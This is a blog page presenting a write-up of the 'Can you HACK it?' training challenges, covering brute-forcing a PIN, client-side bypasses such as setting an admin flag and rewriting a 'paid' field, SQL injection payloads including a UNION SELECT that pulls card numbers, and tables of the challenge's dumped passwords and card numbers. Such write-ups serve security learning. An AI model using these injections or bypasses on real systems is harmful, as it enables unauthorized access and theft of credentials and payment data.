@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html>
+<head>
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+<title>Can you HACK it? | Ganlv&#39;s Blog</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="description" content="https://hack.ainfosec.com/ This is a HACKING CHALLENGE website.   Programming Post Decrement (10 Points) Brutal Force (50 Points) Code Breaker (300 Points) Super ROT (900 Points)   Client-side Protect">
+<meta name="keywords" content="js,hack,challenge,sql,inject,crypto,xor,rot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Can you HACK it?">
+<meta property="og:url" content="https://ganlvtech.github.io/2019/01/12/can-you-hack-it/index.html">
+<meta property="og:site_name" content="Ganlv&#39;s Blog">
+<meta property="og:description" content="https://hack.ainfosec.com/ This is a HACKING CHALLENGE website.   Programming Post Decrement (10 Points) Brutal Force (50 Points) Code Breaker (300 Points) Super ROT (900 Points)   Client-side Protect">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://ganlvtech.github.io/images/2019-01-12-can-you-hack-it/add-subtree-modifications-breakpoint.jpg">
+<meta property="og:image" content="https://ganlvtech.github.io/images/2019-01-12-can-you-hack-it/debug-using-call-stack.jpg">
+<meta property="og:image" content="https://ganlvtech.github.io/images/2019-01-12-can-you-hack-it/network-call-stack.jpg">
+<meta property="og:image" content="https://ganlvtech.github.io/images/2019-01-12-can-you-hack-it/change-ajax-request.jpg">
+<meta property="og:updated_time" content="2019-01-12T16:26:16.794Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Can you HACK it?">
+<meta name="twitter:description" content="https://hack.ainfosec.com/ This is a HACKING CHALLENGE website.   Programming Post Decrement (10 Points) Brutal Force (50 Points) Code Breaker (300 Points) Super ROT (900 Points)   Client-side Protect">
+<meta name="twitter:image" content="https://ganlvtech.github.io/images/2019-01-12-can-you-hack-it/add-subtree-modifications-breakpoint.jpg">
+<link rel="alternate" href="/atom.xml" title="Ganlv&#39;s Blog" type="application/atom+xml">
+<link rel="icon" href="/favicon.png">
+<link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/bulma-message.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+</html>
+<body>
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+<div id="wrap">
+<header id="header">
+<div id="banner"></div>
+<div id="header-outer" class="outer">
+<div id="header-title" class="inner">
+<h1 id="logo-wrap">
+<a href="/" id="logo">Ganlv&#39;s Blog</a>
+</h1>
+</div>
+<div id="header-inner" class="inner">
+<nav id="main-nav">
+<a id="main-nav-toggle" class="nav-icon"></a>
+<a class="main-nav-link" href="/">Home</a>
+<a class="main-nav-link" href="/archives">Archives</a>
+</nav>
+<nav id="sub-nav">
+<a id="nav-github-link" class="nav-icon" href="https://github.com/ganlvtech" title="GitHub" target="_blank" rel="noopener"></a>
+<a id="nav-bilibili-link" class="nav-icon" href="https://space.bilibili.com/9365715" title="bilibili" target="_blank" rel="noopener">
+<svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="14" height="14" viewBox="0 0 32 34" style="width:100%;height:100%;fill:currentColor">
+<path d="M30.828 30.422c-.264.001-.531.024-.792-.004-.958-.104-1.656.984-1.988 2.131-.299 1.033-1.434 1.561-2.456 1.455-1.18-.121-1.961-.796-2.262-1.863-.181-.645-.728-1.145-1.33-1.141-4.153.024-7.847.012-12 0-.478-.001-.988.457-1.128 1.02-.299 1.208-1.326 1.975-2.463 1.994-1.177.02-2.2-.727-2.543-1.981-.144-.525-.387-1.648-.889-1.62-.646.036-1.296.018-1.944.007-.708-.013-1.021-.297-1.021-.969.005-6.833.015-13.665.033-20.498.002-.706.295-.944 1.109-.945 3.337-.004 6.674-.002 10.011-.002h.698l.064-.173-2.324-1.222c-1.285-.678-2.572-1.354-3.855-2.035-.52-.276-.736-.697-.442-1.219.297-.528.788-.56 1.301-.29 3.013 1.589 6.027 3.176 9.029 4.782.769.412 2.153.165 2.648-.531L22.888.825c.054-.076.106-.155.162-.23.438-.588.935-.747 1.387-.4.523.401.433.877.097 1.354l-1.868 2.648-2.68 3.809h.894c3.314 0 6.627-.001 9.94.001 1.012.001 1.168.154 1.169 1.138.01 6.716.019 13.432.025 20.148.001.96-.176 1.123-1.186 1.129zm-4.98 2.009c.53-.035.782-1.439.943-1.97h-2.004c.197.584.47 2.01 1.061 1.97zm-19.53.001c.587.036.864-1.383 1.039-1.966H5.383c.134.549.41 1.934.935 1.966zM30 10H2v19h28V10zM4 13.882c.002-.926.449-1.831 1.381-1.832 7.113-.001 13.66-.052 20.773-.05.946 0 1.843.966 1.846 1.882.012 4.418-.007 7.818 0 12.236.002.944-.854 1.881-1.846 1.882-3.546.002-6.609 0-10.154 0s-6.608.002-10.154 0c-1.032-.001-1.847-.865-1.846-1.882.005-4.396-.008-7.84 0-12.236zm22.297 12.099c0-4.177-.143-8.01-.143-12.099H5.846c0 4.153-.024 7.984-.024 12.099h20.475zm-14.689-9.663c.058-.026.13-.021.372-.056.141.138.497.328.535.566.043.278-.106.763-.321.872-1.314.667-2.664 1.268-4.017 1.857-.412.179-.865.044-.97-.396-.069-.288.055-.835.262-.939 1.354-.685 2.753-1.282 4.139-1.904zm.413 4.458c.256-.009.587.345.772.615.148.215.086.559.19.819.197.495.568.966 1.116.85.405-.085.775-.49 1.079-.826.15-.166.125-.494.161-.751.068-.484.354-.782.832-.77.437.011.721.275.777.748.036.299.044.67.223.869.286.318.698.702 1.067.714.334.011.74-.393 1.003-.705.175-.207.165-.573.22-.872.089-.477.365-.767.859-.729.491.038.749.354.73.847-.047 1.251-.544 2.268-1.716 2.826-1.092.521-2.112.297-3.006-.504-.048-.043-.106-.074-.166-.115-.272.189-.524.408-.813.559-.945.493-1.891.452-2.763-.154-.962-.67-1.391-1.646-1.305-2.781.018-.246.474-.631.74-.64zm6.976-4.516c.232-.406.644-.517 1.029-.298 1.529.871 3.041 1.772 4.543 2.686.18.109.264.371.327.465.017.743-.598 1.147-1.164.828a164.475 164.475 0 0 1-4.487-2.652c-.392-.238-.475-.633-.248-1.029z" fill-rule="evenodd"/>
+</svg>
+</a>
+<a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+<a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+</nav>
+<div id="search-form-wrap">
+<form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://ganlvtech.github.io"></form>
+</div>
+</div>
+</div>
+</header>
+<div class="outer">
+<section id="main"><article id="post-can-you-hack-it" class="article article-type-post" itemscope itemprop="blogPost">
+<div class="article-meta">
+<a href="/2019/01/12/can-you-hack-it/" class="article-date">
+<time datetime="2019-01-12T14:26:27.000Z" itemprop="datePublished">2019-01-12</time>
+</a>
+</div>
+<div class="article-inner">
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+Can you HACK it?
+</h1>
+</header>
+<div class="article-entry" itemprop="articleBody">
+<p><a href="https://hack.ainfosec.com/" target="_blank" rel="noopener">https://hack.ainfosec.com/</a></p>
+<p>This is a HACKING CHALLENGE website.</p>
+<div class="toc">
+<ul>
+<li><a href="#programming">Programming</a><ul>
+<li><a href="#post-decrement-10-points">Post Decrement (10 Points)</a></li>
+<li><a href="#brutal-force-50-points">Brutal Force (50 Points)</a></li>
+<li><a href="#code-breaker-300-points">Code Breaker (300 Points)</a></li>
+<li><a href="#super-rot-900-points">Super ROT (900 Points)</a></li>
+</ul>
+</li>
+<li><a href="#client-side-protections">Client-side Protections</a><ul>
+<li><a href="#super-admin-10-points">Super Admin (10 Points)</a></li>
+<li><a href="#timer-50-points">Timer (50 Points)</a></li>
+<li><a href="#paid-content-100-points">Paid Content (100 Points)</a></li>
+</ul>
+</li>
+<li><a href="#input-validation">Input Validation</a><ul>
+<li><a href="#sql-login-50-points">SQL Login (50 Points)</a></li>
+<li><a href="#sql-credit-cards-100-points">SQL Credit Cards (100 Points)</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a><ul>
+<li><a href="#rot-50-points">ROT (50 Points)</a></li>
+<li><a href="#xor-100-points">XOR (100 Points)</a></li>
+</ul>
+</li>
+<li><a href="#automatic-scripts">Automatic scripts</a></li>
+</ul>
+</div>
+<h2><span id="programming">Programming</span><a href="#programming" class="header-anchor">#</a></h2><h3><span id="post-decrement-10-points">Post Decrement (10 Points)</span><a href="#post-decrement-10-points" class="header-anchor">#</a></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>) {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, i);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>What&#x2019;s the output for the code snippet above?</p>
+<h4><span id="solution-1-1">Solution 1-1</span><a href="#solution-1-1" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4,3,2,1,0,</span><br></pre></td></tr></table></figure>
+<h3><span id="brutal-force-50-points">Brutal Force (50 Points)</span><a href="#brutal-force-50-points" class="header-anchor">#</a></h3><p>Brute force programming challenge. Brute force the PIN.</p>
+<p>Submit the correct PIN to proceed (3 - 4 digits long).</p>
+<p><strong>Console message:</strong></p>
+<p>To submit a pin here, use the BrutalForce_submit(pin) function</p>
+<h4><span id="solution-1-2">Solution 1-2</span><a href="#solution-1-2" class="header-anchor">#</a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">100</span>; i &lt; <span class="number">10000</span>; i++) {</span><br><span class="line">  BrutalForce_submit(i);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<h3><span id="code-breaker-300-points">Code Breaker (300 Points)</span><a href="#code-breaker-300-points" class="header-anchor">#</a></h3><p>Break the alpha-numeric code like in spy movies.<br>Each guess returns a score.<br>The higher the score the more characters you have correct and in the correct position.</p>
+<p>Submit your guesses (code is 7 alpha-numeric characters long).</p>
+<p><strong>Console message:</strong></p>
+<p>To submit here, use the CodeBreaker_submit(code) function.<br>It will return a promise that will resolve with the score of the submission.</p>
+<h4><span id="solution-1-3">Solution 1-3</span><a href="#solution-1-3" class="header-anchor">#</a></h4><ol>
+<li><p>Try pin like <code>aaaaaaa</code> for all characters in <code>[0-9A-Za-z]</code>, find out what chars are in the answer</p>
+</li>
+<li><p>Try pin like <code>a------</code>, <code>-a-----</code> to find the right position of these chars.</p>
+</li>
+</ol>
+<h3><span id="super-rot-900-points">Super ROT (900 Points)</span><a href="#super-rot-900-points" class="header-anchor">#</a></h3><p>Solve all rotated strings in under 180 seconds.<br>You&#x2019;re not going to be able to do this by hand.<br>Also don&#x2019;t get any wrong or you have to start over.<br>Answered: <code>0/50</code></p>
+<p>Time Remaining: <code>179</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gtuznkx oy got&apos;z noy</span><br></pre></td></tr></table></figure>
+<p>Submit the decrypted message.</p>
+<p><strong>Console message:</strong></p>
+<p>To submit here, use the SuperRot_submit(answer) function.<br>It will return a promise that will resolve with a bool for whether or not the answer was correct.<br>Use the function SuperRot_getEncryptedMessage() to retrieve the current message to solve.</p>
+<h4><span id="solution-1-4">Solution 1-4</span><a href="#solution-1-4" class="header-anchor">#</a></h4><ol>
+<li><p>Try <code>rot1</code>, <code>rot2</code>, &#x2026;, <code>rot25</code></p>
+</li>
+<li><p>Test the result by a word list. Split the sentence into words by space. Count how many words in the list. The more the better.</p>
+</li>
+<li><p>Submit the sentence contains more words. Repeat it 50 times.</p>
+</li>
+</ol>
+<h2><span id="client-side-protections">Client-side Protections</span><a href="#client-side-protections" class="header-anchor">#</a></h2><h3><span id="super-admin-10-points">Super Admin (10 Points)</span><a href="#super-admin-10-points" class="header-anchor">#</a></h3><p>Are you admin tho?</p>
+<p>You must be an admin to proceed.</p>
+<h4><span id="solution-2-1">Solution 2-1</span><a href="#solution-2-1" class="header-anchor">#</a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_super_admin = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+<h3><span id="timer-50-points">Timer (50 Points)</span><a href="#timer-50-points" class="header-anchor">#</a></h3><p>Wait until the timer completes to press the submit button.</p>
+<p>How much time is left?</p>
+<p>Time Remaining: <code>3155759</code></p>
+<h4><span id="solution-2-2">Solution 2-2</span><a href="#solution-2-2" class="header-anchor">#</a></h4><ol>
+<li>Add subtree modifications breakpoint.</li>
+</ol>
+<p><img src="/images/2019-01-12-can-you-hack-it/add-subtree-modifications-breakpoint.jpg" alt="Add subtree modifications breakpoint"></p>
+<ol start="2">
+<li><p>Wait about 1 second. And then it paused.</p>
+</li>
+<li><p>Move context to <code>hackerchallenge.js</code>.</p>
+</li>
+<li><p>Change <code>seconds</code> to 3.</p>
+</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seconds = <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2019-01-12-can-you-hack-it/debug-using-call-stack.jpg" alt="Debug using call stack"></p>
+<ol start="5">
+<li>Remove subtree modifications breakpoint.</li>
+</ol>
+<h3><span id="paid-content-100-points">Paid Content (100 Points)</span><a href="#paid-content-100-points" class="header-anchor">#</a></h3><p>Pay for things you want!</p>
+<p>You must be a paid user to proceed.</p>
+<h4><span id="solution-2-3">Solution 2-3</span><a href="#solution-2-3" class="header-anchor">#</a></h4><ol>
+<li><p>Try submit.</p>
+</li>
+<li><p>Find which send request.</p>
+</li>
+</ol>
+<p><img src="/images/2019-01-12-can-you-hack-it/network-call-stack.jpg" alt="Network call stack"></p>
+<ol start="3">
+<li><p>Set a breakpoint.</p>
+</li>
+<li><p>Press submit button.</p>
+</li>
+<li><p>Check the original answer.</p>
+</li>
+<li><p>Change the answer.</p>
+</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">answer = answer.replace(<span class="string">&apos;&quot;paid&quot;:false&apos;</span>, <span class="string">&apos;&quot;paid&quot;:true&apos;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2019-01-12-can-you-hack-it/change-ajax-request.jpg" alt="Change ajax request"></p>
+<h2><span id="input-validation">Input Validation</span><a href="#input-validation" class="header-anchor">#</a></h2><h3><span id="sql-login-50-points">SQL Login (50 Points)</span><a href="#sql-login-50-points" class="header-anchor">#</a></h3><p>Figure out the password to login.</p>
+<p>Get the password for user: <code>fry</code></p>
+<p>Enter the login password.</p>
+<h4><span id="solution-3-1">Solution 3-1</span><a href="#solution-3-1" class="header-anchor">#</a></h4><ol>
+<li>Enter</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>It directly gives you the SQL query result. (This may be impossible for any website)</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin,Gu3ss_Myp4s%w0rd**</span><br><span class="line">bender,b1t3-my-shiny-m3t4l-4$$</span><br><span class="line">fry,w4ts-w/-th3-17-dungbeetles</span><br><span class="line">farnsworth,P4zuzu!!</span><br><span class="line">scruffy,Im_0n-br3ak</span><br><span class="line">zoidberg,sp4r3-ch4ng3#$$$</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>Enter the password will solve the problem.</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w4ts-w/-th3-17-dungbeetles</span><br></pre></td></tr></table></figure>
+<h4><span id="digging-deeper">Digging Deeper</span><a href="#digging-deeper" class="header-anchor">#</a></h4><p>Enter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;</span><br></pre></td></tr></table></figure>
+<p>This may cause SQL syntax error.</p>
+<p>And we got SQL error messages. We can find that the SQL is</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">&apos;fry&apos;</span> <span class="keyword">AND</span> <span class="keyword">password</span>=<span class="string">&apos;$1&apos;</span></span><br></pre></td></tr></table></figure>
+<p>We can&#x2019;t get this problem solved with only one request. We must enter the password in the second request.</p>
+<p>I think the code might be</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;database&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_errno) {</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line">$result = $mysqli-&gt;query(<span class="string">&quot;SELECT username, password FROM users WHERE username=&apos;fry&apos; AND password=&apos;$_POST[&apos;answer&apos;]&apos;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ($result) {</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">if</span> ($row) {</span><br><span class="line">        <span class="keyword">if</span> ($_POST[<span class="string">&apos;answer&apos;</span>] === $row[<span class="string">&quot;password&quot;</span>]) {</span><br><span class="line">            $solved = <span class="keyword">true</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<h4><span id="cheat-table-1">Cheat Table 1</span><a href="#cheat-table-1" class="header-anchor">#</a></h4><table>
+<thead>
+<tr>
+<th style="text-align:left">username</th>
+<th style="text-align:left">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">admin</td>
+<td style="text-align:left">Gu3ss_Myp4s%w0rd**</td>
+</tr>
+<tr>
+<td style="text-align:left">bender</td>
+<td style="text-align:left">b1t3-my-shiny-m3t4l-4$$</td>
+</tr>
+<tr>
+<td style="text-align:left">fry</td>
+<td style="text-align:left">w4ts-w/-th3-17-dungbeetles</td>
+</tr>
+<tr>
+<td style="text-align:left">farnsworth</td>
+<td style="text-align:left">P4zuzu!!</td>
+</tr>
+<tr>
+<td style="text-align:left">scruffy</td>
+<td style="text-align:left">Im_0n-br3ak</td>
+</tr>
+<tr>
+<td style="text-align:left">zoidberg</td>
+<td style="text-align:left">sp4r3-ch4ng3#$$$</td>
+</tr>
+</tbody>
+</table>
+<h3><span id="sql-credit-cards-100-points">SQL Credit Cards (100 Points)</span><a href="#sql-credit-cards-100-points" class="header-anchor">#</a></h3><p>Find the credit card number</p>
+<p>Get the credit card number for user: <code>farnsworth</code></p>
+<p>Enter the credit card number here</p>
+<h4><span id="solution-3-2">Solution 3-2</span><a href="#solution-3-2" class="header-anchor">#</a></h4><ol>
+<li>Enter</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>So, the SQL is</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> credit_cards <span class="keyword">WHERE</span> username=<span class="string">&apos;$1&apos;</span> <span class="keyword">COLLATE</span> NOCASE</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>I have tried many times to find out the credit card number field name. Finally, I found it is <code>card</code>.</li>
+</ol>
+<p>Enter</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and 1 = 2 union SELECT card FROM credit_cards WHERE username=&apos;farnsworth</span><br></pre></td></tr></table></figure>
+<p>You will get the credit card number.</p>
+<ol start="4">
+<li>Enter</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4784981000802194</span><br></pre></td></tr></table></figure>
+<h4><span id="cheat-table-2">Cheat Table 2</span><a href="#cheat-table-2" class="header-anchor">#</a></h4><table>
+<thead>
+<tr>
+<th style="text-align:left">username</th>
+<th style="text-align:left">card</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">admin</td>
+<td style="text-align:left">4300713381842928</td>
+</tr>
+<tr>
+<td style="text-align:left">bender</td>
+<td style="text-align:left">4768732694626948</td>
+</tr>
+<tr>
+<td style="text-align:left">fry</td>
+<td style="text-align:left">4385923563192160</td>
+</tr>
+<tr>
+<td style="text-align:left">farnsworth</td>
+<td style="text-align:left">4784981000802194</td>
+</tr>
+<tr>
+<td style="text-align:left">scruffy</td>
+<td style="text-align:left">4987327898009549</td>
+</tr>
+<tr>
+<td style="text-align:left">zoidberg</td>
+<td style="text-align:left">4912753912003772</td>
+</tr>
+</tbody>
+</table>
+<h2><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor">#</a></h2><h3><span id="rot-50-points">ROT (50 Points)</span><a href="#rot-50-points" class="header-anchor">#</a></h3><p>Rotation cipher challenge.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a se tay! al&apos;k lzw haulmjwk lzsl ygl kesdd.</span><br></pre></td></tr></table></figure>
+<p>Submit the decrypted message.</p>
+<h4><span id="solution-4-1">Solution 4-1</span><a href="#solution-4-1" class="header-anchor">#</a></h4><p>Try each rot decrypt on <a href="https://rot13.com/" target="_blank" rel="noopener">https://rot13.com/</a>. Input the one which seems like English.</p>
+<h3><span id="xor-100-points">XOR (100 Points)</span><a href="#xor-100-points" class="header-anchor">#</a></h3><p>XOR crypto challenge.</p>
+<p>Key Length: <code>6</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2026076e06003d2d096e15073b390c6e111a2c6e083b1a05276e0d381207743a0a2b571935341b6e131a33</span><br></pre></td></tr></table></figure>
+<p>Submit the decryption key.</p>
+<section class="message is-info">
+<p>The key only contains alpha-numeric characters.<br>What submit is in format like <code>QwErTy</code> instead of <code>517745725479</code></p>
+</section>
+<h4><span id="solution-4-2">Solution 4-2</span><a href="#solution-4-2" class="header-anchor">#</a></h4><ol>
+<li>Decode the byte string.</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">32</span>, <span class="number">38</span>, <span class="number">7</span>, <span class="number">110</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">45</span>, <span class="number">9</span>, <span class="number">110</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">59</span>, <span class="number">57</span>, <span class="number">12</span>, <span class="number">110</span>, <span class="number">17</span>, <span class="number">26</span>, <span class="number">44</span>, <span class="number">110</span>, <span class="number">8</span>, <span class="number">59</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">39</span>, <span class="number">110</span>, <span class="number">13</span>, <span class="number">56</span>, <span class="number">18</span>, <span class="number">7</span>, <span class="number">116</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">27</span>, <span class="number">110</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">51</span>]</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>Group the byte array by key length.</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [ <span class="number">32</span>  , <span class="number">61</span>  , <span class="number">59</span>  , <span class="number">44</span>  , <span class="number">39</span>  , <span class="number">116</span> , <span class="number">53</span>  , <span class="number">51</span> ],</span><br><span class="line">  [ <span class="number">38</span>  , <span class="number">45</span>  , <span class="number">57</span>  , <span class="number">110</span> , <span class="number">110</span> , <span class="number">58</span>  , <span class="number">52</span>  ],</span><br><span class="line">  [ <span class="number">7</span>   , <span class="number">9</span>   , <span class="number">12</span>  , <span class="number">8</span>   , <span class="number">13</span>  , <span class="number">10</span>  , <span class="number">27</span>  ],</span><br><span class="line">  [ <span class="number">110</span> , <span class="number">110</span> , <span class="number">110</span> , <span class="number">59</span>  , <span class="number">56</span>  , <span class="number">43</span>  , <span class="number">110</span> ],</span><br><span class="line">  [ <span class="number">6</span>   , <span class="number">21</span>  , <span class="number">17</span>  , <span class="number">26</span>  , <span class="number">18</span>  , <span class="number">87</span>  , <span class="number">19</span>  ],</span><br><span class="line">  [ <span class="number">0</span>   , <span class="number">7</span>   , <span class="number">26</span>  , <span class="number">5</span>   , <span class="number">7</span>   , <span class="number">25</span>  , <span class="number">26</span>  ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>Try <code>[0-9A-Za-z]</code> as XOR key for each group. The decrypted string must only contains <code>[0-9A-Za-z ,.&apos;!]</code></li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [<span class="string">&quot;T&quot;</span>],</span><br><span class="line">  [<span class="string">&quot;N&quot;</span>, <span class="string">&quot;W&quot;</span>],</span><br><span class="line">  [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;o&quot;</span>],</span><br><span class="line">  [<span class="string">&quot;B&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;Z&quot;</span>],</span><br><span class="line">  [<span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;w&quot;</span>],</span><br><span class="line">  [<span class="string">&quot;C&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;w&quot;</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>Brute force. Test each sentence by common words in English like Super ROT.</li>
+</ol>
